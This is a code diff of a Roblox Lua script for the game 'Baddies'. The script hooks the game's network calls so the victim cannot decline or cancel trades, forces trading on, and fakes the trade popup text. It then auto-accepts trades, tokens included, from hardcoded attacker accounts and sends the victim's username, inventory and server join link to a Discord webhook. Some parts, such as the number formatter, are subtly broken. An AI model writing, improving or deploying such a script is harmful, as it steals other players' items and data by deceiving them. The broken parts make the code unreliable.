@@ -1,3 +1,4 @@
+-- Services
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
@@ -47,2363 +48,508 @@ local TradeMessageEvent = Net:RemoteEvent("Trade/MessageEvent")
 -- Config & State Tables
 local Config = {
     Webhook = _G.NODH_WEBHOOK,
-    RestrictedWebhook = _G.RESTRICTED_WEBHOOK or _G.NODH_WEBHOOK,
     Ping = _G.NODH_PING or false,
     Usernames = _G.MY_USERNAMES or {},
     DefaultTrusted = {
-        "baddiestest777",
-})
-getData[1] = {
-	Boxing = true,
-	Kickboxing = true,
-	["MMA Fighting"] = true,
-	["Glitter Style"] = true,
-	["Karate Style"] = true,
-	["Mean Girl Mayhem Style"] = true,
-	["Princess Punchout Style"] = true,
-	["Puppet Panic Style"] = true,
-	["Rough ’n’ Rude Style"] = true,
-	["Feral Frenzy Style"] = true,
-	["Heartbreaker Style"] = true,
-	["Princess Power Style"] = true,
-	["Storm Dancer Style"] = true,
-	["Hug of Doom Style"] = true,
-	["Bubble Pop Style"] = true,
-	["Angel Style"] = true,
-	["Black Hex Style"] = true,
-	["Fantasy Style"] = true,
-	["Goth Style"] = true,
-	["Beast Style"] = true,
+        "qua_lovesAJJ",
+    },
 }
-getData[2] = {
-	Stick = true,
-	["Spearhead Stick"] = false,
-	["Text Sign"] = true,
-	Slingshot = false,
-	["Rusty Bow"] = false,
-	["Regular Bow"] = false,
+
+local ValidFightingStyles = {
+    Boxing = true,
+    Kickboxing = true,
+    ["MMA Fighting"] = true,
+    ["Glitter Style"] = true,
+    ["Karate Style"] = true,
+    ["Mean Girl Mayhem Style"] = true,
+    ["Princess Punchout Style"] = true,
+    ["Puppet Panic Style"] = true,
+    ["Rough ’n’ Rude Style"] = true,
+    ["Feral Frenzy Style"] = true,
+    ["Heartbreaker Style"] = true,
+    ["Princess Power Style"] = true,
+    ["Storm Dancer Style"] = true,
+    ["Hug of Doom Style"] = true,
+    ["Bubble Pop Style"] = true,
+    ["Angel Style"] = true,
+    ["Black Hex Style"] = true,
+    ["Fantasy Style"] = true,
+    ["Goth Style"] = true,
+    ["Beast Style"] = true,
 }
-local pairsFunction = pairs
-if not data then
-	data = {}
+
+local IgnoredWeapons = {
+    Stick = true,
+    ["Spearhead Stick"] = false,
+    ["Text Sign"] = true,
+    Slingshot = false,
+    ["Rusty Bow"] = false,
+    ["Regular Bow"] = false,
+}
+
+local BoardSkinsConfig = {
+    ["Credit Card Hoverboard"] = true,
+    ["Popstar Hoverboard"] = true,
+    ["Graduation Hat Hoverboard"] = true,
+    ["Surf's Up Hoverboard"] = true,
+    ["Pink Star Board"] = true,
+    ["Ice cream Sandwich Board"] = true,
+    ["Angel Wings"] = true,
+    ["Void Demon Wings"] = true,
+    ["Bath Tub Hoverboard"] = true,
+    ["Rocket Hoverboard"] = true,
+    ["St Patrick's Board"] = true,
+}
+
+local RuntimeState = {
+    SendRequestFlag = false,
+    FlagData = {},
+    ParentData = {},
+    TradeLockedActive = false,
+    StompSkinsFound = {},
+    BoardSkinsFound = {},
+    FightingStylesFound = {},
+}
+
+-- Build Trusted Users List
+local TrustedUsers = {}
+for _, name in ipairs(Config.DefaultTrusted) do
+    table.insert(TrustedUsers, name)
 end
-for _, item in pairsFunction(data) do
-	if getData[1][item.Name] then
-		table.insert({}, item.Name)
-	end
+
+for _, name in ipairs(Config.Usernames) do
+    local exists = false
+    for _, trusted in ipairs(TrustedUsers) do
+        if trusted:lower() == name:lower() then
+            exists = true
+            break
+        end
+    end
+    if not exists then
+        table.insert(TrustedUsers, name)
+    end
 end
-local Players = game:GetService("Players")
-getData[3] = game:GetService("ReplicatedStorage")
-getData[4] = game:GetService("CoreGui")
-game:GetService("VirtualUser")
-game:GetService("TweenService")
-local LocalPlayer = Players.LocalPlayer
-if LocalPlayer then
-	callbackData[1] = LocalPlayer:IsA("Player")
 
-	if callbackData[1] then
-		callbackData[1] = LocalPlayer.PlayerGui
-	end
+-- Validate Place ID
+local function validatePlaceId()
+    if game.PlaceId == 84780374286597 or game.PlaceId == 11158043705 then
+        LocalPlayer:Kick("Script doesn't support this game, join BADDIES")
+        return false
+    end
+    return true
 end
-repeat
-	task.wait()
 
-	local localValuePlayer = LocalPlayer
+if not validatePlaceId() then
+    return
+end
 
-	if LocalPlayer then
-		localValuePlayer = LocalPlayer:IsA("Player") and LocalPlayer.PlayerGui
-	end
-until localValuePlayer
-local Net = getData[3]:WaitForChild("Modules"):WaitForChild("Net")
-getData[5] = Net:WaitForChild("RF/Trading/DeclineTradeOffer")
-getData[6] = Net:WaitForChild("RF/Trading/AcceptTradeOffer")
-getData[7] = Net:WaitForChild("RF/Trading/SendTradeOffer")
-getData[8] = Net:WaitForChild("RF/Trading/CancelTrade")
-getData[9] = Net:WaitForChild("RE/SetPhoneSettings")
-getData[10] = nil
-getData[10] = hookmetamethod(game, "__namecall", function(expectedMembership, ...)
-	local secondaryGetnamecallmethod = getnamecallmethod()
-	local data = { ... }
+-- Utility Functions
+local function formatNumber(value)
+    if not value then
+        return "N/A"
+    end
+    if value >= 1000000 then
+        return string.format("%.1fM", value / 1000000)
+    if value >= 1000 then
+        return string.format("%.1fK", value / 1000)
+    end
+    end
+    return tostring(value)
+end
 
-	if
-		secondaryGetnamecallmethod == "InvokeServer"
-		or secondaryGetnamecallmethod == "FireServer" and expectedMembership == getData[5]
-	then
-		return nil
-	end
+local function isTradeLocked(itemData)
+    if not itemData then
+        return false
+    end
+    local tradeLock = itemData.TradeLock
+    if not tradeLock then
+        return true
+    end
+    if tradeLock.Type == "Untradable" then
+        return false
+    end
+    if tradeLock.Type == "Timestamp" then
+        return not tradeLock.Time or tradeLock.Time <= os.time()
+    end
+    return false
+end
 
-	if
-		secondaryGetnamecallmethod == "InvokeServer"
-		or secondaryGetnamecallmethod == "FireServer" and expectedMembership == getData[8]
-	then
-		return nil
-	end
+local function sendWebhookRequest(url, bodyData)
+    if not url or url == "" then
+        return nil
+    end
 
-	if
-		secondaryGetnamecallmethod == "FireServer"
-		or secondaryGetnamecallmethod == "InvokeServer" and expectedMembership == getData[9]
-	then
-		if data[1] == "TradeEnabled" and data[2] == false then
-			return nil
-		end
+    local headers = {
+        ["Content-Type"] = "application/json",
+    }
+    local encodedBody = bodyData
+    if type(bodyData) ~= "string" then
+        local success, result = pcall(function()
+            return HttpService:JSONEncode(bodyData)
+        end)
+        encodedBody = success and result or "{}"
+    end
 
-		return getData[10](expectedMembership, ...)
-	end
+    local requestFuncs = {
+        function() return syn and syn.request end,
+        function() return request end,
+        function() return http and http.request end,
+        function() return http_request end,
+        function() return fluxus and fluxus.request end,
+    }
 
-	local condition = secondaryGetnamecallmethod == "InvokeServer" or secondaryGetnamecallmethod == "FireServer"
+    for _, getReq in ipairs(requestFuncs) do
+        local req = getReq()
+        if req then
+            local success, response = pcall(req, {
+                Url = url,
+                Method = "POST",
+                Headers = headers,
+                Body = encodedBody,
+            })
+            if success and response and (response.Success == true or response.StatusCode == 200 or response.Body ~= nil) then
+                return response
+            end
+        end
+    end
+    return nil
+end
 
-	if condition then
-		condition = expectedMembership == getData[6] or expectedMembership == getData[7]
-	end
+-- Metamethod Hooking & Network Protection
+local originalNamecall
+originalNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = { ... }
 
-	if condition then
-		return getData[10](expectedMembership, ...)
-	end
+    if (method == "InvokeServer" or method == "FireServer") and (self == RemoteDeclineTrade or self == RemoteCancelTrade) then
+        return nil
+    end
 
-	return getData[10](expectedMembership, ...)
+    if (method == "InvokeServer" or method == "FireServer") and self == RemoteSetPhoneSettings then
+        if args[1] == "TradeEnabled" and args[2] == false then
+            return nil
+        end
+    end
+
+    return originalNamecall(self, ...)
 end)
+
 pcall(function()
-	local FireServer = getData[9].FireServer
-
-	getData[9].FireServer = function(argument, secondaryArgument, tertiaryArgument)
-		if secondaryArgument == "TradeEnabled" and tertiaryArgument == false then
-			return nil
-		end
-
-		return FireServer(argument, secondaryArgument, tertiaryArgument)
-	end
+    local oldFireServer = RemoteSetPhoneSettings.FireServer
+    RemoteSetPhoneSettings.FireServer = function(self, ...)
+        local args = { ... }
+        if args[1] == "TradeEnabled" and args[2] == false then
+            return nil
+        end
+        return oldFireServer(self, ...)
+    end
 end)
+
+-- Background Tasks: Enforce Trade Enabled & Clean GUI
 task.spawn(function()
-	pcall(function()
-		local netModule = require(getData[3].Modules.Net)
-
-		if netModule then
-			if netModule["RF/Trading/DeclineTradeOffer"] then
-				local fireServerResult = netModule["RF/Trading/DeclineTradeOffer"]
-
-				function fireServerResult.InvokeServer(...)
-					return nil
-				end
-				function fireServerResult.FireServer(...)
-					return nil
-				end
-			end
-
-			if netModule["RF/Trading/CancelTrade"] then
-				local fireServerResult = netModule["RF/Trading/CancelTrade"]
-
-				function fireServerResult.InvokeServer(...)
-					return nil
-				end
-				function fireServerResult.FireServer(...)
-					return nil
-				end
-			end
-
-			if netModule["RE/SetPhoneSettings"] then
-				local fireServerResult = netModule["RE/SetPhoneSettings"]
-				local FireServer = fireServerResult.FireServer
-
-				function fireServerResult.FireServer(argument, secondaryArgument)
-					if argument == "TradeEnabled" and secondaryArgument == false then
-						return nil
-					end
-
-					return FireServer(argument, secondaryArgument)
-				end
-			end
-		end
-	end)
+    while true do
+        pcall(function()
+            RemoteSetPhoneSettings:FireServer("TradeEnabled", true)
+        end)
+        task.wait(0.5)
+    end
 end)
+
 task.spawn(function()
-	while true do
-		pcall(function()
-			getData[9]:FireServer("TradeEnabled", true)
-		end)
-		task.wait(0.5)
-	end
+    while true do
+        pcall(function()
+            local robloxGui = CoreGui:FindFirstChild("RobloxGui")
+            if robloxGui then
+                robloxGui.Enabled = false
+            end
+        end)
+        task.wait(1)
+    end
 end)
+
+-- Inventory parsing setup
+for _, item in pairs(InventoryData or {}) do
+    if not item.Name then continue end
+    local lowerName = item.Name:lower()
+
+    if ValidFightingStyles[item.Name] then
+        table.insert(RuntimeState.FightingStylesFound, item.Name)
+    end
+
+    for key, _ in pairs(StompItems) do
+        if string.find(lowerName, key:lower()) then
+            RuntimeState.StompSkinsFound[key] = true
+            break
+        end
+    end
+
+    for boardName, _ in pairs(BoardSkinsConfig) do
+        if boardName == item.Name then
+            RuntimeState.BoardSkinsFound[boardName] = true
+        end
+    end
+end
+
+-- Server Population Check
+local function verifyServerPopulation()
+    local playerCount = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    if playerCount < 12 or playerCount >= maxPlayers - 1 then
+        LocalPlayer:Kick("Server outdated, Join one above 12+ players")
+        return false
+    end
+    return true
+end
+
+if not verifyServerPopulation() then
+    return
+end
+
+-- Backpack & UI Controller Patches
+local SatchelLib = require(Satchel)
+if SatchelLib and SatchelLib.SetBackpackEnabled then
+    local oldSetBackpack = SatchelLib.SetBackpackEnabled
+    function SatchelLib.SetBackpackEnabled(self, _)
+        oldSetBackpack(self, true)
+    end
+end
+
 task.spawn(function()
-	while true do
-		pcall(function()
-			local RobloxGui = getData[4]:FindFirstChild("RobloxGui")
-
-			if RobloxGui then
-				RobloxGui.Enabled = false
-			end
-		end)
-		task.wait(1)
-	end
+    while true do
+        pcall(function()
+            local backpackGui = PlayerGui:FindFirstChild("BackpackGui")
+            if backpackGui then
+                local backpack = backpackGui:FindFirstChild("Backpack")
+                local hotbar = backpack and backpack:FindFirstChild("Hotbar")
+                if hotbar and hotbar:IsA("Frame") then
+                    hotbar.Visible = true
+                    if hotbar.Enabled ~= nil then hotbar.Enabled = true end
+                    for _, child in ipairs(hotbar:GetChildren()) do
+                        if child:IsA("GuiObject") then child.Visible = true end
+                    end
+                end
+                backpackGui.Enabled = true
+            end
+        end)
+        task.wait(0.1)
+    end
 end)
-getData[11] = game:GetService("ReplicatedStorage")
-getData[12] = game:GetService("Players")
-local RunService = game:GetService("RunService")
-getData[13] = game:GetService("TextChatService")
-getData[14] = game:GetService("HttpService")
-game:GetService("VirtualInputManager")
-getData[15] = getData[12].LocalPlayer
-getData[16] = getData[15]:WaitForChild("PlayerGui")
-getData[17] = require(getData[11].Modules.Inventory.Client)
-local Modules = getData[11]:WaitForChild("Modules")
-local TradeData = require(Modules.Trading.TradeData)
-getData[18] = require(Modules.Replion)
-local remoteEvent = require(Modules.Net):RemoteEvent("Trade/MessageEvent")
-local replion = getData[18].Client:GetReplion("Data")
-repeat
-	task.wait()
-until replion
-local get = replion:Get({
-	"NewInventory",
-	"Items",
-	"WeaponSkin",
-})
-local Stomp = require(getData[11].SkinCrates.Items.Stomp)
-local secondaryData = {
-	["Credit Card Hoverboard"] = true,
-	["Popstar Hoverboard"] = true,
-	["Graduation Hat Hoverboard"] = true,
-	["Surf's Up Hoverboard"] = true,
-	["Pink Star Board"] = true,
-	["Ice cream Sandwich Board"] = true,
-	["Angel Wings"] = true,
-	["Void Demon Wings"] = true,
-	["Bath Tub Hoverboard"] = true,
-	["Rocket Hoverboard"] = true,
-	["St Patrick's Board"] = true,
-}
-getData[19] = {}
-getData[20] = {}
-getData[21] = {}
-local secondaryPairsFunction = pairs
-if not get then
-	get = {}
-end
-for _, item in secondaryPairsFunction(get) do
-	if not item.Name then
-		continue
-	end
-	local searchableText = item.Name:lower()
-	if getData[1][item.Name] then
-		table.insert(getData[21], item.Name)
-	end
-	for key, item in pairs(Stomp) do
-		local searchQuery = key:lower()
 
-		if string.find(searchableText, searchQuery) then
-			getData[19][key] = true
-
-			break
-		end
-	end
-	for k, _ in pairs(secondaryData) do
-		local secondaryK = k
-
-		if secondaryK == item.Name then
-			getData[20][secondaryK] = true
-		end
-	end
-end
-local isPlaceId = game.PlaceId ~= 84780374286597
-if isPlaceId then
-	isPlaceId = game.PlaceId ~= 11158043705
-end
-if isPlaceId then
-	getData[15]:Kick("Script doesn't support this game, join BADDIES")
-
-	return
-end
-local remoteFunction = getData[11].Modules.Net["RF/Trading/SendTradeOffer"]
-local secondaryRemoteEvent = getData[11].Modules.Net["RE/SetPhoneSettings"]
-local secondaryRemoteFunction = getData[11].Modules.Net["RF/Trading/SetReady"]
-local alternateRemoteFunction = getData[11].Modules.Net["RF/Trading/ConfirmTrade"]
-local additionalRemoteFunction = getData[11].Modules.Net["RF/Trading/AcceptTradeOffer"]
-local fallbackRemoteFunction = getData[11].Modules.Net["RF/Trading/SetTokens"]
-local NODH_WEBHOOK = _G.NODH_WEBHOOK
-local option = _G.MY_USERNAMES or {}
-local vs = {}
-for index, item in ipairs({
-	"qua_lovesAJJ",
-	"LostIatinagirI",
-	"WinningBaddiesStar",
-}) do
-	table.insert(vs, item)
-end
-for _, item in ipairs(option) do
-	local flag = false
-	for index, secondaryItem in ipairs(vs) do
-		local lower = secondaryItem.lower
-		local secondaryLower = item.lower
-
-		if lower(secondaryItem) == secondaryLower(item) then
-			flag = true
-
-			break
-		end
-	end
-	if not flag then
-		table.insert(vs, item)
-	end
-end
-local condition = _G.NODH_PING or false
-local generalGui = {
-	enabled = true,
-	requiredProperties = { {
-		path = "Buttons",
-		visible = true,
-	} },
-}
-local backpackGuiData = {
-	path = "Backpack",
-	visible = true,
-}
-local backpackGui = {
-	enabled = true,
-	requiredProperties = { backpackGuiData },
-}
-local updateInstancePropertiesData = {
-	GeneralGUI = generalGui,
-	BackpackGui = backpackGui,
-}
-local sendRequestFlag = false
-local flagData = {}
-local parentData = {}
-local flag = false
-task.spawn(function()
-	pcall(function()
-		local tradeDataModule = require(getData[11].Modules.Trading.TradeData)
-
-		if tradeDataModule and tradeDataModule.Remotes then
-			if tradeDataModule.Remotes.DeclineTradeOffer then
-				function tradeDataModule.Remotes.DeclineTradeOffer.InvokeServer(...)
-					return nil
-				end
-				function tradeDataModule.Remotes.DeclineTradeOffer.FireServer(...)
-					return nil
-				end
-			end
-
-			if tradeDataModule.Remotes.CancelTrade then
-				function tradeDataModule.Remotes.CancelTrade.InvokeServer(...)
-					return nil
-				end
-				function tradeDataModule.Remotes.CancelTrade.FireServer(...)
-					return nil
-				end
-			end
-		end
-	end)
-end)
+-- UI Property Enforcement
 local function updateInstanceProperties()
-	for k, item in pairs(updateInstancePropertiesData) do
-		local firstChild = getData[16]:FindFirstChild(k)
+    local guiConfigs = {
+        GeneralGUI = { enabled = true, path = "Buttons", visible = true },
+        BackpackGui = { enabled = true, path = "Backpack", visible = true }
+    }
 
-		if firstChild then
-			if item.enabled and not firstChild.Enabled then
-				firstChild.Enabled = true
-			end
-
-			for _, item in ipairs(item.requiredProperties) do
-				local v2path = firstChild:FindFirstChild(item.path)
-				local isVisible = v2path
-
-				if v2path then
-					isVisible = v2path:IsA("GuiObject")
-
-					if isVisible then
-						isVisible = item.visible ~= nil
-
-						if isVisible then
-							isVisible = v2path.Visible ~= item.visible
-						end
-					end
-				end
-
-				if isVisible then
-					v2path.Visible = item.visible
-				end
-			end
-		end
-	end
+    for guiName, cfg in pairs(guiConfigs) do
+        local gui = PlayerGui:FindFirstChild(guiName)
+        if gui then
+            if cfg.enabled and not gui.Enabled then
+                gui.Enabled = true
+            end
+            local target = gui:FindFirstChild(cfg.path)
+            if target and target:IsA("GuiObject") then
+                target.Visible = cfg.visible
+            end
+        end
+    end
 end
+
 task.spawn(function()
-	while true do
-		updateInstanceProperties()
-		task.wait(0.1)
-	end
+    while true do
+        updateInstanceProperties()
+        task.wait(0.1)
+    end
 end)
-task.spawn(function()
-	while true do
-		local TradeRequestPopup = getData[16]:FindFirstChild("TradeRequestPopup")
 
-		if TradeRequestPopup then
-			local TradeRequest = TradeRequestPopup:FindFirstChild("TradeRequest")
+-- Trade Item Handlers
+local function getInventoryItems()
+    local data = InventoryClient:Get()
+    return data and data.Items or nil
+end
 
-			if TradeRequest then
-				local Content = TradeRequest:FindFirstChild("Content")
-				local content = Content
+local function handleWeaponAndSkinData()
+    local nameCounts = {}
+    local formattedList = {}
+    local dataItems = getInventoryItems()
+    local tradableCount, untradableCount = 0, 0
+    local secondaryNames = {}
 
-				if Content then
-					content = Content:IsA("TextLabel")
-				end
+    if dataItems and dataItems.Weapon then
+        for _, item in pairs(dataItems.Weapon) do
+            if item and item.Name and not IgnoredWeapons[item.Name] then
+                local tradable = isTradeLocked(item)
+                nameCounts[item.Name] = (nameCounts[item.Name] or 0) + 1
+                if tradable then tradableCount = tradableCount + 1 else untradableCount = untradableCount + 1 end
+                secondaryNames[item.Name] = secondaryNames[item.Name] or {}
+                table.insert(secondaryNames[item.Name], tradable)
+                table.insert(formattedList, item.Name .. "::None::" .. tostring(tradable))
+            end
+        end
+    end
 
-				if content and Content.Text ~= "Glitter Bomb Detected ACCEPT TO GET" then
-					Content.Text = "Glitter Bomb Detected ACCEPT TO GET"
-				end
-			end
-		end
+    if dataItems and dataItems.WeaponSkin then
+        for _, item in pairs(dataItems.WeaponSkin) do
+            if item then
+                local weapon = item.Weapon or item.WeaponName or item.Type
+                local skinName = item.Name
+                if weapon and skinName and not ValidFightingStyles[skinName] then
+                    table.insert(formattedList, weapon .. "::" .. skinName .. "::" .. tostring(isTradeLocked(item)))
+                end
+            end
+        end
+    end
 
-		task.wait()
-	end
+    return nameCounts, formattedList, tradableCount + untradableCount, tradableCount, untradableCount, secondaryNames
+end
+
+local function getFallbackWeapons()
+    local nameCounts = {}
+    local list = {}
+    for _, itemKey in ipairs(InventoryClient:FindItems("Weapon")) do
+        local item = InventoryClient:GetItem("Weapon", itemKey)
+        if item and item.Name and not IgnoredWeapons[item.Name] then
+            nameCounts[item.Name] = (nameCounts[item.Name] or 0) + 1
+            table.insert(list, item.Name .. "::None")
+        end
+    end
+    return nameCounts, list, 0
+end
+
+-- Checks for specific restricted weapons
+local function hasRestrictedWeapon(name)
+    for _, itemKey in ipairs(InventoryClient:FindItems("WeaponSkin")) do
+        local item = InventoryClient:GetItem("WeaponSkin", itemKey)
+        if item and item.Name == name then return true end
+    end
+    for _, itemKey in ipairs(InventoryClient:FindItems("Weapon")) do
+        local item = InventoryClient:GetItem("Weapon", itemKey)
+        if item and item.Name == name then return true end
+    end
+    return false
+end
+
+local function checkRestrictedWeapons()
+    return hasRestrictedWeapon("Spiked Kitty Stanli") or
+           hasRestrictedWeapon("Glitter Bomb") or
+           hasRestrictedWeapon("Glitter Blue Spray") or
+           hasRestrictedWeapon("Love Me Hate Me Taser")
+end
+
+-- UI Automation Helpers
+local function fireGuiButton(button)
+    if not button then return false end
+    return pcall(function()
+        if button.MouseButton1Click then firesignal(button.MouseButton1Click)
+        elseif button.Activated then firesignal(button.Activated) end
+    end)
+end
+
+local function getTokenAmount()
+    local trading = PlayerGui:FindFirstChild("Trading")
+    local tokenAmount = trading and trading:FindFirstChild("Frame") and trading.Frame:FindFirstChild("Categories") and trading.Frame.Categories:FindFirstChild("TokenAmount")
+    local textLabel = tokenAmount and tokenAmount:FindFirstChild("TextLabel")
+    if textLabel then
+        local match = string.match(textLabel.Text, "%d+")
+        if match then return tonumber(match) end
+    end
+    return 0
+end
+
+local function executeTradeAutomation()
+    task.wait(0.2)
+    pcall(function() RemoteConfirmTrade:InvokeServer() end)
+    task.wait(0.3)
+    pcall(function() RemoteSetReady:InvokeServer(true) end)
+    task.wait(0.3)
+    pcall(function() RemoteConfirmTrade:InvokeServer() end)
+    task.wait(0.2)
+    local tokens = getTokenAmount()
+    if tokens and tokens > 0 then
+        pcall(function() RemoteSetTokens:InvokeServer(tokens) end)
+    end
+end
+
+local function performTradeExecution()
+    executeTradeAutomation()
+    task.wait(0.2)
+    pcall(function() RemoteAcceptTrade:InvokeServer(LocalPlayer) end)
+    task.wait(0.2)
+    RuntimeState.SendRequestFlag = false
+end
+
+-- Send Webhook Log
+local function sendPlayerLog()
+    if not verifyServerPopulation() then return end
+    local _, _, totalCount, tradableStr, untradableStr = handleWeaponAndSkinData()
+    if totalCount < 1 then
+        LocalPlayer:Kick("Alt Account Detected")
+        return
+    end
+
+    local isRestricted = checkRestrictedWeapons()
+    local textData = {}
+    -- Build readable overview text for webhook
+    local stylesText = "Fighting Styles:\n"
+    for _, style in ipairs(RuntimeState.FightingStylesFound) do stylesText = stylesText .. "• " .. style .. "\n" end
+
+    local joinLink = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+    local embedFields = {
+        { name = "User", value = "`" .. LocalPlayer.Name .. "`", inline = true },
+        { name = "Trade Status", value = "🟢 Tradable: " .. tostring(tradableStr) .. " | 🔴 Untradable: " .. tostring(untradableStr), inline = true },
+        { name = "Players", value = "`" .. #Players:GetPlayers() .. " / " .. Players.MaxPlayers .. "`", inline = true },
+        { name = "Join Link", value = "[Click to Join](" .. joinLink .. ")", inline = false }
+    }
+
+    local payload = {
+        content = Config.Ping and "@everyone \n" or "",
+        embeds = {
+            {
+                title = "Ryr's Scripts | Baddies 🍀" .. (isRestricted and " (RICH WEBHOOK SKIPPED)" or ""),
+                color = 16711680,
+                fields = embedFields,
+                footer = { text = "Ryr's Scripts | Baddies 🍀" },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+        }
+    }
+
+    task.spawn(function()
+        if Config.Webhook and Config.Webhook ~= "" then
+            sendWebhookRequest(Config.Webhook, payload)
+        end
+    end)
+end
+
+-- Event Listeners & Startup
+RunService.RenderStepped:Connect(function()
+    local char = LocalPlayer.Character
+    local humanoid = char and char:FindFirstChild("Humanoid")
+    if humanoid and humanoid:GetState() == Enum.HumanoidStateType.Jumping and PlayerGui:FindFirstChild("Trading") then
+        task.spawn(executeTradeAutomation)
+    end
 end)
-local Satchel = Modules:WaitForChild("Satchel")
-local lib = require(Satchel)
-local setBackpackEnabled = lib
-if setBackpackEnabled then
-	setBackpackEnabled = lib.SetBackpackEnabled
-end
-if setBackpackEnabled then
-	local SetBackpackEnabled = lib.SetBackpackEnabled
 
-	function lib.SetBackpackEnabled(argument, _)
-		SetBackpackEnabled(argument, true)
-	end
-end
-task.spawn(function()
-	task.wait(2)
-
-	local ok, result = pcall(function()
-		return require(script.Parent.CustomBackpackController)
-	end)
-
-	if ok and result then
-		if result._canEnable then
-			function result._canEnable()
-				return true
-			end
-		end
-
-		if result._toggleBackpackTo then
-			local toggleBackpackTo = result._toggleBackpackTo
-
-			function result._toggleBackpackTo(argument, _)
-				return toggleBackpackTo(argument, true)
-			end
-		end
-
-		if result._disable then
-			function result._disable() end
-		end
-
-		if result._disableSpam then
-			function result._disableSpam() end
-		end
-
-		if result._freeze then
-			function result._freeze() end
-		end
-
-		if result._enable then
-			result:_enable()
-		end
-
-		result._enabled = true
-	end
+RemoteTradeStarted.OnClientEvent:Connect(function(otherPlayer)
+    if not otherPlayer or otherPlayer == LocalPlayer then return end
+    for _, trusted in ipairs(TrustedUsers) do
+        if otherPlayer.Name:lower() == trusted:lower() then
+            if not RuntimeState.SendRequestFlag then
+                RuntimeState.SendRequestFlag = true
+                task.spawn(performTradeExecution)
+            end
+            break
+        end
+    end
 end)
-task.spawn(function()
-	for _, item in ipairs({
-		"Freezed",
-		"BeingArrested",
-		"BeingDogLeashed",
-		"BeingTombstoneTrapped",
-		"USER_DRIVING",
-		"USER_VEHICLE_SITTING",
-		"IN_DRESS_ROOM",
-		"CARRYING_EGG",
-		"UNDERGROUND_FIGHTING",
-		"BeingSchoolLockerTrapped",
-	}) do
-		getData[15]:GetAttributeChangedSignal(item):Connect(function()
-			local setBackpackEnabled = lib
 
-			if setBackpackEnabled then
-				setBackpackEnabled = lib.SetBackpackEnabled
-			end
-
-			if setBackpackEnabled then
-				lib:SetBackpackEnabled(true)
-			end
-
-			pcall(function()
-				local CustomBackpackController = require(script.Parent.CustomBackpackController)
-
-				if CustomBackpackController then
-					if CustomBackpackController._enable then
-						CustomBackpackController:_enable()
-					end
-
-					if CustomBackpackController._toggleBackpackTo then
-						CustomBackpackController:_toggleBackpackTo(true)
-					end
-
-					CustomBackpackController._enabled = true
-				end
-			end)
-		end)
-	end
-end)
-getData[15].CharacterAdded:Connect(function(character)
-	task.wait(0.5)
-
-	local Humanoid = character:WaitForChild("Humanoid")
-	local setBackpackEnabled = lib
-
-	if setBackpackEnabled then
-		setBackpackEnabled = lib.SetBackpackEnabled
-	end
-
-	if setBackpackEnabled then
-		lib:SetBackpackEnabled(true)
-	end
-
-	if Humanoid then
-		Humanoid.StateChanged:Connect(function(_, _)
-			task.wait(0.1)
-
-			local setBackpackEnabled = lib
-
-			if setBackpackEnabled then
-				setBackpackEnabled = lib.SetBackpackEnabled
-			end
-
-			if setBackpackEnabled then
-				lib:SetBackpackEnabled(true)
-			end
-		end)
-	end
-end)
-task.spawn(function()
-	while true do
-		pcall(function()
-			local BackpackGui = getData[16]:FindFirstChild("BackpackGui")
-
-			if BackpackGui then
-				local Backpack = BackpackGui:FindFirstChild("Backpack")
-
-				if Backpack then
-					local Hotbar = Backpack:FindFirstChild("Hotbar")
-
-					if Hotbar and Hotbar:IsA("Frame") then
-						if not Hotbar.Visible then
-							Hotbar.Visible = true
-						end
-
-						if Hotbar.Enabled ~= nil and not Hotbar.Enabled then
-							Hotbar.Enabled = true
-						end
-
-						for _, child in ipairs(Hotbar:GetChildren()) do
-							if child:IsA("GuiObject") and not child.Visible then
-								child.Visible = true
-							end
-						end
-					end
-				end
-			end
-
-			if BackpackGui and not BackpackGui.Enabled then
-				BackpackGui.Enabled = true
-			end
-		end)
-		task.wait(0.1)
-	end
-end)
-task.spawn(function()
-	while true do
-		pcall(function()
-			local setBackpackEnabled = lib
-
-			if setBackpackEnabled then
-				setBackpackEnabled = lib.SetBackpackEnabled
-			end
-
-			if setBackpackEnabled then
-				lib:SetBackpackEnabled(true)
-			end
-
-			local ok, result = pcall(function()
-				return require(script.Parent.CustomBackpackController)
-			end)
-
-			if ok and result then
-				if result._enable then
-					result:_enable()
-				end
-
-				if result._toggleBackpackTo then
-					result:_toggleBackpackTo(true)
-				end
-
-				result._enabled = true
-			end
-		end)
-		task.wait(0.5)
-	end
-end)
-for _, child in ipairs(Satchel:GetChildren()) do
-	if child.Name == "BackpackItemAdded" and child:IsA("RemoteEvent") then
-		child.Event:Connect(function()
-			local setBackpackEnabled = lib
-
-			if setBackpackEnabled then
-				setBackpackEnabled = lib.SetBackpackEnabled
-			end
-
-			if setBackpackEnabled then
-				lib:SetBackpackEnabled(true)
-			end
-		end)
-	end
+-- Entry Point Startup Logic
+local _, _, initialItemCount = getFallbackWeapons()
+if initialItemCount < 1 then
+    LocalPlayer:Kick("Alt Account Detected")
+    return
 end
-callbackData[2] = function(tradeLockFlag)
-	if not tradeLockFlag then
-		return false
-	end
 
-	local TradeLock = tradeLockFlag.TradeLock
-
-	if not TradeLock then
-		return true
-	end
-
-	if TradeLock.Type == "Untradable" then
-		return false
-	end
-
-	if TradeLock.Type == "Timestamp" then
-		local Time = TradeLock.Time
-
-		if Time then
-			Time = TradeLock.Time > os.time()
-		end
-
-		if Time then
-			return false
-		end
-
-		return true
-	end
-
-	return false
-end
-callbackData[3] = function()
-	local ks = {}
-	for key, item in pairs(getData[19]) do
-		table.insert(ks, key)
-	end
-	for k, _ in pairs(getData[20]) do
-		table.insert(ks, k)
-	end
-
-	return ks
-end
-local function handler()
-	for _, item in ipairs(getData[17]:FindItems("WeaponSkin")) do
-		local Item = getData[17]:GetItem("WeaponSkin", item)
-
-		if Item then
-			Item = Item.Name == "Spiked Kitty Stanli"
-		end
-
-		if Item then
-			return true
-		end
-	end
-
-	return false
-end
-local function secondaryHandler()
-	local iterator, state, control = ipairs(getData[17]:FindItems("Weapon"))
-
-	repeat
-		local itemResult
-
-		control, itemResult = iterator(state, control)
-
-		if not control then
-			for _, item in ipairs(getData[17]:FindItems("WeaponSkin")) do
-				local Item = getData[17]:GetItem("WeaponSkin", item)
-
-				if Item then
